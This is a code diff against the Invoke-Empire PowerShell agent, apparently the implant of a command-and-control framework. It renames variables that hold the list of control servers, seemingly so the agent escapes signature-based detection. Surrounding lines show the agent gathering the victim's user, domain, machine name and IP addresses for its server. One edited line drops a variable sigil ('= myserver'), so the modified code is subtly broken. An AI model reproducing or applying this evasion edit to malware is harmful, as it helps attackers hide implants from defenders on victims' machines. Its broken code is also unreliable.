@@ -60,7 +60,7 @@ function Invoke-Empire {
         $AgentJitter = 0,
 
         [String[]]
-        $Servers,
+        $myserver,
 
         [String]
         $KillDate,
@@ -104,8 +104,8 @@ function Invoke-Empire {
     $script:CurrentListenerName = "";
 
     # the currently active server
-    $Script:ServerIndex = 0;
-    $Script:ControlServers = $Servers;
+    $Script:sIndex = 0;
+    $Script:Cservs = myserver;
 
     # the number of times to retry server connections, i.e. the 'lost limit
     $Retries = 1;
@@ -229,7 +229,7 @@ function Invoke-Empire {
     function Get-Sysinfo {
         # no nonce for normal execution
         $str = '0|';
-        $str += $Script:ControlServers[$Script:ServerIndex];
+        $str += $Script:Cservs[$Script:sIndex];
         $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
         $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
         $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
@@ -256,7 +256,7 @@ function Invoke-Empire {
     # function Add-Servers {
     #     param([string[]]$BackupServers)
     #     foreach ($backup in $BackupServers) {
-    #         $Script:ControlServers = $Script:ControlServers + $backup
+    #         $Script:Cservs = $Script:Cservs + $backup
     #     }
     # }
 
